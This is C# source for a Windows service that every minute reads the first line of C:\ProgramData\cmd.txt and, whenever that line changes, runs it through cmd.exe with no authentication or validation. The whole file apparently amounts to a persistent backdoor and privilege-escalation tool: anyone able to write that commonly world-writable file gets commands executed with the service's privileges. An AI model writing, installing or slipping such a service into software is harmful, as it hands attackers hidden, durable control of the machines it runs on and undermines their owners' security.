using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.ServiceProcess;
using System.Timers;

namespace SVC
{
    static class Program
    {
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[] { new svc() };
            ServiceBase.Run(ServicesToRun);
        }
    }

    public partial class svc : ServiceBase
    {
        Timer timer = new Timer();
        private ArrayList ChildProcesses = new ArrayList();
        private string oldCmd = "";

        private string getCmd()
        {
            string cm = @"C:\ProgramData\cmd.txt";
            if (File.Exists(cm))
            {
                using (StreamReader file = new StreamReader(cm))
                {
                    cm = file.ReadLine();
                }
            }
            return cm;
        }
        private void exeCmd(string cm)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/C " + cm;
            proc.StartInfo.UseShellExecute = false;
            if (proc.Start())
            {
                ChildProcesses.Add(proc.Id);
            }
        }

        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            string cmd = getCmd();
            if (oldCmd != cmd)
            {
                exeCmd(cmd);
                oldCmd = cmd;
            }
        }
        public svc()
        {
        }
        protected override void OnStart(string[] args)
        {
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 60000;
            timer.Enabled = true;
        }
        protected override void OnStop()
        {
            foreach (int procId in ChildProcesses)
            {
                try
                {
                    Process proc = Process.GetProcessById(procId);
                    proc.Kill();
                }
                catch { }
            }
            ChildProcesses.Clear();
        }
        protected override void OnShutdown()
        {
            base.OnShutdown();
        }
    }
}
